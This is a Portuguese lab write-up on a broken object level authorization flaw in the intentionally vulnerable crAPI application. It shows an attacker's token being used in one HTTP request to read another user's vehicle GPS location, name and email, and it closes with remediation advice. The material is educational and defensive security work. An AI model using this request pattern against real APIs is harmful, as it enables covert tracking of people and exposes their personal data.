🇧🇷 Português · [🇺🇸 English](../en/vulnerabilities/01-bola-vehicle-location.md)

# BOLA — Acesso à localização do veículo de outro usuário

**Categoria OWASP API Security Top 10 (2023):** `API1 — Broken Object Level Authorization`
**Severidade estimada:** `Alta`
**Desafio crAPI correspondente:** BOLA / Challenge 1 — "access details of another user's vehicle"

---

## 1. Resumo

A API expõe a localização de um veículo a partir do seu identificador (`vehicleId`), mas **não verifica se o veículo pertence ao usuário autenticado**. Um atacante que descubra o ID do veículo de outra pessoa consegue consultar a localização GPS dela, mesmo usando o próprio token.

## 2. Pré-condições

- Conta do **atacante** (usuário B) autenticada, com token JWT válido.
- O **`vehicleId` da vítima** (usuário A). Os IDs são GUIDs (não sequenciais), então não dá para simplesmente incrementar um número — é preciso obtê-lo por outro vazamento (ver [Excessive Data Exposure](03-excessive-data-exposure.md), onde posts do fórum expõem IDs de veículos de outros usuários).

## 3. Passo a passo da exploração

1. Autentique-se como atacante e obtenha o token (ver [ambiente](../00-ambiente-crapi.md)).
2. Obtenha o `vehicleId` da vítima (por exemplo, via endpoint de posts da comunidade).
3. Consulte a localização do veículo da vítima usando **o token do atacante**:

```http
GET /identity/api/v2/vehicle/{vehicleId_DA_VITIMA}/location HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token_do_atacante>
```

Se a API retornar as coordenadas do veículo da vítima, a autorização por objeto está quebrada.

## 4. Evidência

**Confirmado contra a instância local** — captura em [`evidencias/01-bola/captura.txt`](../../evidencias/01-bola/captura.txt).

Usando o token do **atacante** sobre o `vehicleId` de outro usuário (obtido via [Excessive Data Exposure](03-excessive-data-exposure.md)):

```
GET /identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location
Authorization: Bearer <token_do_atacante>

HTTP 200
{"carId":"f89b5f21-...","vehicleLocation":{"latitude":"32.778889","longitude":"-91.919243"},
 "fullName":"Adam","email":"adam007@example.com"}
```

A API retornou a **localização GPS, o nome e o e-mail** de um veículo que não pertence ao atacante.

## 5. Por que é um risco

Localização de veículo é dado sensível de rastreamento físico de uma pessoa. A falha permite **espionar a posição de qualquer usuário** cujo ID de veículo seja descoberto. BOLA é a falha nº 1 do OWASP API Top 10 justamente porque é comum, fácil de explorar e tem alto impacto: autorização por objeto costuma ser esquecida quando o backend confia no ID enviado pelo cliente.

## 6. Como corrigir

- Validar, **no servidor**, que o objeto solicitado pertence ao usuário autenticado (comparar o `owner` do veículo com o `sub`/ID do token) antes de retornar qualquer dado.
- Centralizar a verificação de propriedade em um middleware/policy, em vez de depender de cada handler.
- Usar IDs não adivinháveis é defesa em profundidade, **não** substitui o controle de autorização.

## 7. Referências

- [API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
